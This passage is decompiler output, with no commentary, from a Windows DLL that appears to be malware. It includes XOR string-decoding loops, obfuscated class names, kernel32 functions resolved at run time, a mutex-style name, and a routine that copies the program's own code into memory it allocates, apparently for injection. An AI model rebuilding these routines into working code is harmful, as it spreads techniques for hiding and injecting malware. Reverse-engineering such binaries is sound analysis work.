  v4 = (*(int (__thiscall **)(_DWORD, void *))(**(_DWORD **)(this + 12) + 64))(*(_DWORD *)(this + 12), &unk_100BF728);
  v5 = Block;
  v17 = (int *)v4;
  if ( Block == (int *)-1 )
    v5 = (int *)v4;
  v6 = 0;
  if ( v5 && sub_10019FC2(this) )
    v6 = sub_1001A533((unsigned int)v5 - 1, this);
  Blocka = 0;
  if ( v5 != v17 && sub_10019FC2(this) )
    Blocka = (void *)sub_1001A533((unsigned int)v5, this);
  sub_1001A5C5(v6, (int)v18, this);
  sub_1001A5C5((int)v18, (int)Blocka, this);
  (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(this + 12) + 32))(
    *(_DWORD *)(this + 12),
    &unk_100BF728,
    (int)v17 + 1);
  Blockb = operator new(0x24u);
  LOBYTE(v19) = 3;
  if ( Blockb )
  {
    v11 = v12;
    v17 = &v11;
    sub_1000CE26(&v11, (int)&unk_100BF730);
    LOBYTE(v19) = 4;
    v10 = v15;
    v18 = &v9;
    v9 = v14;
    InterlockedIncrement(v15);
    LOBYTE(v19) = 3;
    v7 = sub_10018255(Blockb, v9, v10, v11, v12);
  }
  else
  {
    v7 = 0;
  }
  LOBYTE(v19) = 2;
  sub_10003BC8(a2, (int)v7);
  v16 = 1;
  LOBYTE(v19) = 1;
  sub_10003C0C(&v14);
  LOBYTE(v19) = 0;
  sub_100171F2(v13);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1001A156: using guessed type _DWORD var_28[2];

//----- (1001A299) --------------------------------------------------------
int __thiscall sub_1001A299(int *this, unsigned int a2)
{
  int v3; // ebx
  int v4; // eax
  int v5; // edi
  _DWORD *v6; // eax
  int v7; // eax
  _DWORD v9[2]; // [esp+10h] [ebp-24h] BYREF
  int v10[2]; // [esp+18h] [ebp-1Ch] BYREF
  int v11[4]; // [esp+20h] [ebp-14h] BYREF
  int v12; // [esp+30h] [ebp-4h]
  int v13; // [esp+3Ch] [ebp+8h]

  sub_100171BE(this, v9);
  v12 = 0;
  v13 = sub_1001A533(a2, (int)this);
  sub_1001A4AC(this, v11, v13);
  LOBYTE(v12) = 1;
  v3 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v11[0] + 64))(v11[0], &unk_100BF718);
  v4 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v11[0] + 64))(v11[0], &unk_100BF710);
  sub_1001A5C5(v3, v4, (int)this);
  v5 = this[3];
  v6 = sub_1001A452(v10, v13);
  LOBYTE(v12) = 2;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v5 + 92))(v5, v6);
  LOBYTE(v12) = 1;
  sub_1000CE59(v10);
  v7 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)this[3] + 64))(this[3], &unk_100BF728);
  (*(void (__thiscall **)(int, void *, int))(*(_DWORD *)this[3] + 32))(this[3], &unk_100BF728, v7 - 1);
  LOBYTE(v12) = 0;
  sub_10003C0C(v11);
  v12 = -1;
  return sub_100171F2(v9);
}
// 1001A299: using guessed type _DWORD var_24[2];

//----- (1001A353) --------------------------------------------------------
int __usercall sub_1001A353@<eax>(int a1@<esi>)
{
  _DWORD v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  sub_100171BE((int *)a1, v2);
  v3 = 0;
  (*(void (__thiscall **)(_DWORD, void *))(**(_DWORD **)(a1 + 12) + 92))(*(_DWORD *)(a1 + 12), &unk_100BF7AC);
  (*(void (__thiscall **)(_DWORD, void *, _DWORD))(**(_DWORD **)(a1 + 12) + 32))(*(_DWORD *)(a1 + 12), &unk_100BF728, 0);
  (*(void (__thiscall **)(_DWORD, void *, _DWORD))(**(_DWORD **)(a1 + 12) + 32))(*(_DWORD *)(a1 + 12), &unk_100BF720, 0);
  (*(void (__thiscall **)(_DWORD, void *, _DWORD))(**(_DWORD **)(a1 + 12) + 32))(*(_DWORD *)(a1 + 12), &unk_100BF700, 0);
  (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(a1 + 12) + 32))(*(_DWORD *)(a1 + 12), &unk_100BF708, 1);
  v3 = -1;
  return sub_100171F2(v2);
}
// 1001A353: using guessed type _DWORD var_14[4];

//----- (1001A3C6) --------------------------------------------------------
int __thiscall sub_1001A3C6(int **this)
{
  return sub_10017087(this[3]);
}

//----- (1001A3D1) --------------------------------------------------------
int __thiscall sub_1001A3D1(int *this)
{
  return sub_10017063(this[3]);
}

//----- (1001A402) --------------------------------------------------------
int __usercall sub_1001A402@<eax>(int a1@<ebx>)
{
  int v1; // edi
  int v2; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  sub_100171BE((int *)a1, v4);
  v5 = 0;
  v1 = (*(int (__thiscall **)(_DWORD, void *))(**(_DWORD **)(a1 + 12) + 64))(*(_DWORD *)(a1 + 12), &unk_100BF708);
  v2 = v1 + 1;
  if ( v1 == -1 )
    v2 = 1;
  (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(a1 + 12) + 32))(*(_DWORD *)(a1 + 12), &unk_100BF708, v2);
  v5 = -1;
  sub_100171F2(v4);
  return v1;
}
// 1001A402: using guessed type _DWORD var_14[4];

//----- (1001A452) --------------------------------------------------------
_DWORD *__stdcall sub_1001A452(_DWORD *a1, int a2)
{
  int v3[2]; // [esp+10h] [ebp-18h] BYREF
  int v4; // [esp+18h] [ebp-10h]
  int v5; // [esp+24h] [ebp-4h]

  v4 = 0;
  sub_10012A00(v3, word_100B7DA0);
  v5 = 1;
  sub_1000D184((int)v3, aD, a2);
  sub_1000CE26(a1, (int)v3);
  v4 = 1;
  LOBYTE(v5) = 0;
  sub_10012AAC(v3);
  return a1;
}
// 100B7DA0: using guessed type wchar_t word_100B7DA0[2];
// 100B7DA4: using guessed type wchar_t aD[3];

//----- (1001A4AC) --------------------------------------------------------
_DWORD *__thiscall sub_1001A4AC(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // eax
  int v6; // [esp-10h] [ebp-38h]
  volatile LONG *v7; // [esp-Ch] [ebp-34h]
  int v8; // [esp-8h] [ebp-30h] BYREF
  int v9; // [esp-4h] [ebp-2Ch]
  int *v10; // [esp+10h] [ebp-18h]
  int v11; // [esp+14h] [ebp-14h]
  void *Block; // [esp+18h] [ebp-10h]
  int v13; // [esp+24h] [ebp-4h]

  v11 = 0;
  Block = operator new(0x24u);
  v13 = 1;
  if ( Block )
  {
    v8 = v9;
    v10 = &v8;
    sub_1001A452(&v8, a3);
    LOBYTE(v13) = 2;
    v7 = (volatile LONG *)this[4];
    v6 = this[3];
    InterlockedIncrement(v7);
    LOBYTE(v13) = 1;
    v4 = sub_10018255(Block, v6, v7, v8, v9);
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v13) = 0;
  sub_10003BC8(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001A533) --------------------------------------------------------
int __usercall sub_1001A533@<eax>(unsigned int a1@<ecx>, int a2@<esi>)
{
  int i; // edi
  _DWORD *v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+18h] [ebp-18h] BYREF
  _DWORD pExceptionObject[4]; // [esp+1Ch] [ebp-14h] BYREF
  int v9; // [esp+2Ch] [ebp-4h]

  sub_100171BE((int *)a2, v6);
  v9 = 0;
  if ( a1 >= sub_10019FC2(a2) )
  {
    sub_1001668F(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  for ( i = (*(int (__thiscall **)(_DWORD, void *))(**(_DWORD **)(a2 + 12) + 64))(*(_DWORD *)(a2 + 12), &unk_100BF720);
        a1;
        --a1 )
  {
    v4 = sub_1001A4AC((_DWORD *)a2, &v7, i);
    LOBYTE(v9) = 1;
    i = (*(int (__thiscall **)(_DWORD, void *))(*(_DWORD *)*v4 + 64))(*v4, &unk_100BF710);
    LOBYTE(v9) = 0;
    sub_10003C0C(&v7);
  }
  v9 = -1;
  sub_100171F2(v6);
  return i;
}
// 1001A533: using guessed type _DWORD var_20[2];
// 1001A533: using guessed type _DWORD pExceptionObject[4];

//----- (1001A5C5) --------------------------------------------------------
void __usercall sub_1001A5C5(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  if ( a1 )
  {
    sub_1001A4AC((_DWORD *)a3, v3, a1);
    v4 = 0;
    (*(void (__thiscall **)(int, void *, int))(*(_DWORD *)v3[0] + 32))(v3[0], &unk_100BF710, a2);
    v4 = -1;
    sub_10003C0C(v3);
  }
  else
  {
    (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(a3 + 12) + 32))(*(_DWORD *)(a3 + 12), &unk_100BF720, a2);
  }
  if ( a2 )
  {
    sub_1001A4AC((_DWORD *)a3, v3, a2);
    v4 = 1;
    (*(void (__thiscall **)(int, void *, int))(*(_DWORD *)v3[0] + 32))(v3[0], &unk_100BF718, a1);
    v4 = -1;
    sub_10003C0C(v3);
  }
  else
  {
    (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(a3 + 12) + 32))(*(_DWORD *)(a3 + 12), &unk_100BF700, a1);
  }
}

//----- (1001A656) --------------------------------------------------------
int __stdcall sub_1001A656(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10093F78;
  *(_DWORD *)a1 = &off_10093F90;
  *(_BYTE *)(a1 + 4) = -1;
  return result;
}
// 10093F78: using guessed type int (__thiscall *off_10093F78)(void *Block, char);
// 10093F90: using guessed type int (__thiscall *off_10093F90)(void *Block, char);

//----- (1001A685) --------------------------------------------------------
_DWORD *__thiscall sub_1001A685(_DWORD *Block, char a2)
{
  sub_1001A6CB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001A6AB) --------------------------------------------------------
_DWORD *__thiscall sub_1001A6AB(_DWORD *Block, char a2)
{
  *Block = &off_10093F78;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10093F78: using guessed type int (__thiscall *off_10093F78)(void *Block, char);

//----- (1001A6CB) --------------------------------------------------------
void __thiscall sub_1001A6CB(_DWORD *this)
{
  *this = &off_10093F90;
  *this = &off_10093F78;
}
// 10093F78: using guessed type int (__thiscall *off_10093F78)(void *Block, char);
// 10093F90: using guessed type int (__thiscall *off_10093F90)(void *Block, char);

//----- (1001A6F1) --------------------------------------------------------
_BYTE *__thiscall sub_1001A6F1(_BYTE *this, _DWORD *a2, int pExceptionObject)
{
  _BYTE *result; // eax
  unsigned int v5; // edi
  char v6; // bl
  _BYTE *v8; // [esp+14h] [ebp+8h]

  v8 = (_BYTE *)a2[3];
  result = v8;
  if ( v8 != *(_BYTE **)(pExceptionObject + 12) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v5 = 0;
  if ( v8 )
  {
    do
    {
      v6 = *(_BYTE *)(a2[2] + *(_DWORD *)(a2[1] + 12) + v5) ^ this[4];
      result = (_BYTE *)sub_10016C51(pExceptionObject, v5++);
      *result = v6;
    }
    while ( v5 < (unsigned int)v8 );
  }
  return result;
}

//----- (1001A757) --------------------------------------------------------
char sub_1001A757()
{
  return 1;
}

//----- (1001A75A) --------------------------------------------------------
int __stdcall sub_1001A75A(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10093FA8;
  *(_DWORD *)a1 = &off_10093FC0;
  *(_BYTE *)(a1 + 4) = -1;
  return result;
}
// 10093FA8: using guessed type int (__thiscall *off_10093FA8)(void *Block, char);
// 10093FC0: using guessed type int (__thiscall *off_10093FC0)(void *Block, char);

//----- (1001A789) --------------------------------------------------------
_DWORD *__thiscall sub_1001A789(_DWORD *Block, char a2)
{
  sub_1001A7CF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001A7AF) --------------------------------------------------------
_DWORD *__thiscall sub_1001A7AF(_DWORD *Block, char a2)
{
  *Block = &off_10093FA8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10093FA8: using guessed type int (__thiscall *off_10093FA8)(void *Block, char);

//----- (1001A7CF) --------------------------------------------------------
void __thiscall sub_1001A7CF(_DWORD *this)
{
  *this = &off_10093FC0;
  *this = &off_10093FA8;
}
// 10093FA8: using guessed type int (__thiscall *off_10093FA8)(void *Block, char);
// 10093FC0: using guessed type int (__thiscall *off_10093FC0)(void *Block, char);

//----- (1001A7F5) --------------------------------------------------------
_BYTE *__thiscall sub_1001A7F5(_BYTE *this, _DWORD *a2, int pExceptionObject)
{
  _BYTE *result; // eax
  unsigned int v5; // edi
  char v6; // bl
  _BYTE *v8; // [esp+14h] [ebp+8h]

  v8 = (_BYTE *)a2[3];
  result = v8;
  if ( v8 != *(_BYTE **)(pExceptionObject + 12) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v5 = 0;
  if ( v8 )
  {
    do
    {
      v6 = *(_BYTE *)(a2[2] + *(_DWORD *)(a2[1] + 12) + v5) ^ this[4];
      result = (_BYTE *)sub_10016C51(pExceptionObject, v5++);
      *result = v6;
    }
    while ( v5 < (unsigned int)v8 );
  }
  return result;
}

//----- (1001A85B) --------------------------------------------------------
char sub_1001A85B()
{
  return 1;
}

//----- (1001A85E) --------------------------------------------------------
int __usercall sub_1001A85E@<eax>(_DWORD *a1@<esi>)
{
  if ( a1[2] == -1 )
    a1[2] = (*(int (__thiscall **)(_DWORD *))(*a1 + 24))(a1);
  return a1[2];
}

//----- (1001A872) --------------------------------------------------------
void sub_1001A872()
{
  int v0; // ebx
  _DWORD *v1; // eax
  int v2; // eax
  char *v3; // eax
  char *v4; // esi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8[3]; // [esp+10h] [ebp-4B8h] BYREF
  char *v9; // [esp+1Ch] [ebp-4ACh]
  int pExceptionObject; // [esp+20h] [ebp-4A8h] BYREF
  char *v11; // [esp+24h] [ebp-4A4h]
  _DWORD v12[4]; // [esp+28h] [ebp-4A0h] BYREF
  char v13[1164]; // [esp+38h] [ebp-490h] BYREF
  int v14; // [esp+4C4h] [ebp-4h]

  v12[2] = 0;
  v0 = dword_100B8F1C;
  v12[3] = dword_100B8F1C;
  v14 = 0;
  v1 = sub_10022750(v8);
  LOBYTE(v14) = 1;
  v2 = sub_1001A85E(v1);
  LOBYTE(v0) = sub_1001B793(v0, (int)v13, v2) == 0;
  LOBYTE(v14) = 0;
  sub_10001FCC(v8);
  if ( (_BYTE)v0 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v3 = (char *)sub_1002476A(aKernel32Dll_1);
  v4 = v3;
  if ( !v3 )
  {
    sub_10016441(v12);
    _CxxThrowException(v12, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v12[1] = sub_1002491F(v3, aExitthread);
  v9 = sub_1002491F(v4, aUnmapviewoffil);
  v11 = sub_1002491F(v4, aVirtualfree);
  v13[1140] = 0;
  v5 = sub_10073C16(0, (int)v13);
  if ( v5 )
  {
    v6 = v5 - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( !v7 )
        __asm { retn }
      if ( v7 == 1 )
        __asm { retn }
    }
  }
  ExitThread(0);
}
// 100B78B4: using guessed type wchar_t aKernel32Dll_1[13];
// 100B8F1C: using guessed type int dword_100B8F1C;
// 1001A872: using guessed type int var_4B8[3];

//----- (1001A9C7) --------------------------------------------------------
int __userpurge sub_1001A9C7@<eax>(_DWORD *a1@<ebx>, int a2@<edi>, int a3)
{
  *(_DWORD *)a3 = off_10093FD8;
  sub_1000FF31(a2, (_DWORD *)(a3 + 4));
  sub_10016AE9(a1, a3 + 16);
  *(_DWORD *)(a3 + 36) = 0;
  *(_BYTE *)(a3 + 40) = 0;
  *(_BYTE *)(a3 + 41) = 0;
  return a3;
}
// 10093FD8: using guessed type int (__thiscall *off_10093FD8[2])(void *Block, char);

//----- (1001AA0F) --------------------------------------------------------
void *__thiscall sub_1001AA0F(void *Block, char a2)
{
  sub_1001AB03((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001AA2E) --------------------------------------------------------
int __thiscall sub_1001AA2E(void *this, int a2, int a3)
{
  volatile LONG *v3; // ecx
  void *v4; // eax
  volatile LONG *v6; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-64h]
  HANDLE v8[10]; // [esp+10h] [ebp-50h] BYREF
  int v9[6]; // [esp+38h] [ebp-28h] BYREF
  int v10; // [esp+50h] [ebp-10h]
  int v11; // [esp+5Ch] [ebp-4h]

  v7 = (volatile LONG *)(a2 + 4);
  *(_DWORD *)a2 = off_10093FD8;
  sub_1000FF31((int)this, v7);
  v11 = 1;
  v10 = a2 + 16;
  sub_10016983(0, a2 + 16, 0);
  v7 = v3;
  v6 = v3;
  *(_DWORD *)(a2 + 36) = 0;
  *(_BYTE *)(a2 + 40) = 0;
  *(_BYTE *)(a2 + 41) = 0;
  v9[5] = (int)&v6;
  sub_10014512(&v6);
  LOBYTE(v11) = 1;
  sub_10011AFB(-1, 0x80000000, v8, a3, 128, -1, (int)v6, v7);
  LOBYTE(v11) = 3;
  sub_10011CA3(v8);
  v7 = 0;
  v4 = (void *)sub_100122A1(v8);
  sub_10016983(v4, (int)v9, (void *)v7);
  LOBYTE(v11) = 4;
  sub_10012521(v8, v9);
  sub_10016B2F(v9, v10);
  LOBYTE(v11) = 3;
  sub_10016B53(v9);
  LOBYTE(v11) = 1;
  sub_10011C44((int)v8);
  return a2;
}
// 1001AA68: variable 'v3' is possibly undefined
// 10093FD8: using guessed type int (__thiscall *off_10093FD8[2])(void *Block, char);
// 1001AA2E: using guessed type HANDLE var_50[10];

//----- (1001AB03) --------------------------------------------------------
LONG __thiscall sub_1001AB03(int this)
{
  *(_DWORD *)this = off_10093FD8;
  if ( *(_BYTE *)(this + 41) && *(_BYTE *)(this + 40) )
    sub_1001B18B(this);
  sub_10016B53((int *)(this + 16));
  return sub_10001FCC((int *)(this + 4));
}
// 10093FD8: using guessed type int (__thiscall *off_10093FD8[2])(void *Block, char);

//----- (1001AB69) --------------------------------------------------------
void __fastcall sub_1001AB69(int a1, int a2, int a3)
{
  int v3; // edi
  bool v4; // zf
  void **p_pExceptionObject; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v9; // eax
  _DWORD *v10; // eax
  int v11; // eax
  _DWORD *v12; // edi
  _DWORD *v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  _ThrowInfo *v16; // ecx
  unsigned int v17; // esi
  const wchar_t *v18; // edi
  int v19; // eax
  size_t v20; // ecx
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  DWORD v24; // eax
  int v25; // esi
  char *v26; // eax
  int v27; // ecx
  int v28; // eax
  _ThrowInfo *v29; // [esp-8h] [ebp-BFCh] BYREF
  _ThrowInfo *v30; // [esp-4h] [ebp-BF8h]
  char v31; // [esp+13h] [ebp-BE1h]
  int v32; // [esp+14h] [ebp-BE0h]
  void *pExceptionObject; // [esp+18h] [ebp-BDCh] BYREF
  int v34[2]; // [esp+1Ch] [ebp-BD8h] BYREF
  int v35; // [esp+24h] [ebp-BD0h]
  void *Block[3]; // [esp+28h] [ebp-BCCh] BYREF
  int *v37[2]; // [esp+34h] [ebp-BC0h] BYREF
  int v38[4]; // [esp+3Ch] [ebp-BB8h] BYREF
  const wchar_t *v39; // [esp+4Ch] [ebp-BA8h]
  _DWORD v40[2]; // [esp+50h] [ebp-BA4h] BYREF
  HANDLE v41[5]; // [esp+58h] [ebp-B9Ch] BYREF
  _DWORD v42[10]; // [esp+6Ch] [ebp-B88h] BYREF
  char v43; // [esp+94h] [ebp-B60h]
  int v44[5]; // [esp+98h] [ebp-B5Ch] BYREF
  int v45[717]; // [esp+ACh] [ebp-B48h] BYREF
  int v46; // [esp+BF0h] [ebp-4h]

  v32 = 0;
  v3 = a1;
  v4 = *(_BYTE *)(a1 + 40) == 0;
  v35 = a1;
  if ( !v4 )
  {
    sub_1002EBB1(&pExceptionObject);
    v30 = (_ThrowInfo *)&_TI2_AVDehafrYfplitlVwgdehAfryfplit_gfjjefwq_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  sub_1001BDF4(v37);
  v46 = 0;
  sub_1001BEA0(v40);
  LOBYTE(v46) = 1;
  if ( *(_DWORD *)(*(_DWORD *)(a2 + 4) + 28) )
  {
    v7 = sub_1000CC20(v34, word_100B78F8);
    LOBYTE(v46) = 2;
    sub_10015CC3((__int32)v7, (int)Block);
    v8 = (_DWORD *)sub_10016A08(a2, (int)v38);
    LOBYTE(v46) = 3;
    sub_10015CDE(v8, (int)Block);
    LOBYTE(v46) = 2;
    sub_10016B53(v38);
    v9 = sub_1001A85E((_DWORD *)(v3 + 4));
    sub_1000D184((int)v34, aUpdtSyncMtxTme, Block[2], v9);
    pExceptionObject = operator new(0x10u);
    LOBYTE(v46) = 4;
    if ( pExceptionObject )
    {
      v10 = sub_1001445F(Block);
      LOBYTE(v46) = 5;
      v30 = *(_ThrowInfo **)(*v10 + 4);
      v32 = 1;
      v11 = sub_100174BF((int)pExceptionObject, 17, (int)v34, 1, (struct _SECURITY_ATTRIBUTES *)v30);
    }
    else
    {
      v11 = 0;
    }
    v46 = 6;
    sub_1001BE5A(v37, v11);
    v46 = 2;
    if ( (v32 & 1) != 0 )
    {
      v32 &= ~1u;
      sub_100015D8(Block);
    }
    v12 = operator new(8u);
    Block[0] = v12;
    LOBYTE(v46) = 7;
    if ( v12 )
      v13 = sub_100171BE(v37[0], v12);
    else
      v13 = 0;
    LOBYTE(v46) = 2;
    sub_1001BF06(v40, (int)v13);
    LOBYTE(v46) = 1;
    sub_1000CE59(v34);
    v3 = v35;
  }
  memset(v45, 0, 2860);
  pExceptionObject = (void *)(v3 + 4);
  v14 = sub_1001A85E((_DWORD *)(v3 + 4));
  if ( !sub_1001BBA7(a3, (int)v45, v14) )
  {
    sub_10016441(&pExceptionObject);
    v30 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  if ( !*(_DWORD *)(*(_DWORD *)(a2 + 4) + 28)
    || (sub_1000CC20(v34, (wchar_t *)&v45[154] + 1), LOBYTE(v46) = 8, v32 |= 2u, v31 = 1, !sub_10017637((int)v34)) )
  {
    v31 = 0;
  }
  v46 = 1;
  if ( (v32 & 2) != 0 )
  {
    v32 &= ~2u;
    sub_1000CE59(v34);
  }
  if ( v31 )
  {
    sub_1000CC20(v34, (wchar_t *)&v45[154] + 1);
    LOBYTE(v46) = 9;
    v15 = sub_1001445F(Block);
    LOBYTE(v46) = 10;
    sub_100174BF((int)v41, 16, (int)v34, 0, *(struct _SECURITY_ATTRIBUTES **)(*v15 + 4));
    LOBYTE(v46) = 12;
    sub_100015D8(Block);
    LOBYTE(v46) = 13;
    sub_1000CE59(v34);
    sub_100171BE((int *)v41, v34);
    LOBYTE(v46) = 14;
    v30 = v16;
    v29 = v16;
    Block[0] = &v29;
    sub_1000CC20(&v29, (wchar_t *)&v45[24]);
    LOBYTE(v46) = 14;
    sub_1002EEB0(v38, 0x5508u, (LPSECURITY_ATTRIBUTES)1, (int)v29, (int)v30);
    LOBYTE(v46) = 16;
    Block[0] = (void *)v39;
    v17 = 0;
    v18 = v39 + 13;
    while ( _wcsicmp(v18, *(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12)) )
    {
      ++v17;
      v18 += 272;
      if ( v17 >= 0x28 )
      {
        LOBYTE(v46) = 14;
        sub_1002F012(v38);
        LOBYTE(v46) = 13;
        sub_100171F2(v34);
        LOBYTE(v46) = 1;
        sub_100175EC(v41);
        goto LABEL_26;
      }
    }
    v26 = (char *)Block[0] + 544 * v17;
    ++*((_DWORD *)v26 + 4);
    v27 = *((_DWORD *)v26 + 2);
    v28 = v35;
    *(_DWORD *)(v35 + 36) = v27;
    *(_BYTE *)(v28 + 40) = 1;
    LOBYTE(v46) = 14;
    sub_1002F012(v38);
    LOBYTE(v46) = 13;
    sub_100171F2(v34);
    LOBYTE(v46) = 1;
    sub_100175EC(v41);
  }
  else
  {
LABEL_26:
    (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)pExceptionObject + 44))(
      pExceptionObject,
      v42,
      &byte_10073611 - (char *)sub_1007358F,
      4,
      4096);
    LOBYTE(v46) = 17;
    v19 = *(_DWORD *)(a2 + 4);
    v20 = 522;
    if ( (unsigned int)(2 * *(_DWORD *)(v19 + 28)) <= 0x20A )
      v20 = 2 * *(_DWORD *)(v19 + 28);
    memcpy(&v45[449], *(const void **)(v19 + 12), v20);
    v21 = (_DWORD *)sub_10016983((void *)(&byte_10073611 - (char *)sub_1007358F), (int)v38, sub_1007358F);
    LOBYTE(v46) = 18;
    sub_10028BB4(v42, v21);
    LOBYTE(v46) = 17;
    sub_10016B53(v38);
    v45[581] = v42[8];
    v45[582] = &byte_10073611 - (char *)sub_1007358F;
    v22 = (_DWORD *)sub_10016983((void *)0xB2C, (int)v44, v45);
    LOBYTE(v46) = 19;
    Block[0] = (void *)sub_10016DC4(v22, (int)v41, (_DWORD *)(v35 + 16));
    LOBYTE(v46) = 20;
    v23 = (_DWORD *)sub_10016983((void *)(&byte_10073C15 - (char *)sub_10073612), (int)v38, sub_10073612);
    LOBYTE(v46) = 21;
    v24 = sub_1002EC4A((int)pExceptionObject, v23, (_DWORD *)Block[0]);
    v25 = v35;
    *(_DWORD *)(v35 + 36) = v24;
    LOBYTE(v46) = 20;
    sub_10016B53(v38);
    LOBYTE(v46) = 19;
    sub_10016B53((int *)v41);
    LOBYTE(v46) = 17;
    sub_10016B53(v44);
    v4 = *(_DWORD *)(v25 + 36) == 0;
    v43 = 1;
    if ( v4 )
    {
      sub_10016441(Block);
      v30 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
      p_pExceptionObject = Block;
LABEL_3:
      _CxxThrowException(p_pExceptionObject, v30);
    }
    *(_BYTE *)(v25 + 40) = 1;
    LOBYTE(v46) = 1;
    sub_10028854((int)v42);
  }
  LOBYTE(v46) = 0;
  sub_1001BEDB(v40);
  v46 = -1;
  sub_1001BE2F(v37);
}
// 1001AE7A: variable 'v16' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10073611: using guessed type char byte_10073611;
// 10073C15: using guessed type char byte_10073C15;
// 100B78F8: using guessed type wchar_t word_100B78F8[2];
// 100B78FC: using guessed type wchar_t aUpdtSyncMtxTme[31];
// 1001AB69: using guessed type _DWORD var_BA4[2];
// 1001AB69: using guessed type int var_BB8[4];
// 1001AB69: using guessed type HANDLE var_B9C[5];
// 1001AB69: using guessed type int var_B5C[5];

//----- (1001B18B) --------------------------------------------------------
void __thiscall sub_1001B18B(int this)
{
  char v2; // al
  int v3; // eax
  _DWORD *v4; // eax
  DWORD v5; // esi
  int v6; // eax
  _ThrowInfo *v7; // [esp-4h] [ebp-4D8h]
  int v8[5]; // [esp+10h] [ebp-4C4h] BYREF
  int v9[5]; // [esp+24h] [ebp-4B0h] BYREF
  int v10; // [esp+38h] [ebp-49Ch]
  int v11; // [esp+3Ch] [ebp-498h] BYREF
  _DWORD *pExceptionObject; // [esp+40h] [ebp-494h] BYREF
  char v13[1164]; // [esp+44h] [ebp-490h] BYREF
  int v14; // [esp+4D0h] [ebp-4h]

  v2 = *(_BYTE *)(this + 40);
  v10 = this;
  if ( !v2 )
  {
    sub_1002EB5F(&pExceptionObject);
    v7 = (_ThrowInfo *)&_TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__;
    goto LABEL_3;
  }
  v11 = this + 4;
  v3 = sub_1001A85E((_DWORD *)(this + 4));
  if ( !sub_1001B793(*(_DWORD *)(this + 36), (int)v13, v3) )
  {
    sub_10016441(&pExceptionObject);
    v7 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
LABEL_3:
    _CxxThrowException(&pExceptionObject, v7);
  }
  v13[1140] = 1;
  pExceptionObject = (_DWORD *)sub_10016983((void *)0x47C, (int)v9, v13);
  v14 = 0;
  v4 = (_DWORD *)sub_10016983((void *)(&byte_10073D48 - (char *)sub_10073C16), (int)v8, sub_10073C16);
  LOBYTE(v14) = 1;
  v5 = sub_1002EC4A(v11, v4, pExceptionObject);
  LOBYTE(v14) = 0;
  sub_10016B53(v8);
  v14 = -1;
  sub_10016B53(v9);
  if ( v5 != 1 )
  {
    sub_10016441(&v11);
    _CxxThrowException(&v11, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = v10;
  *(_BYTE *)(v10 + 40) = 0;
  *(_DWORD *)(v6 + 36) = 0;
  sub_1006A5A7();
}
// 10073D48: using guessed type char byte_10073D48;
// 1001B18B: using guessed type int var_4B0[5];
// 1001B18B: using guessed type int var_4C4[5];

//----- (1001B2F6) --------------------------------------------------------
int __userpurge sub_1001B2F6@<eax>(
        int a1@<esi>,
        int a2,
        int pExceptionObject,
        char a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14)
{
  int v14; // eax
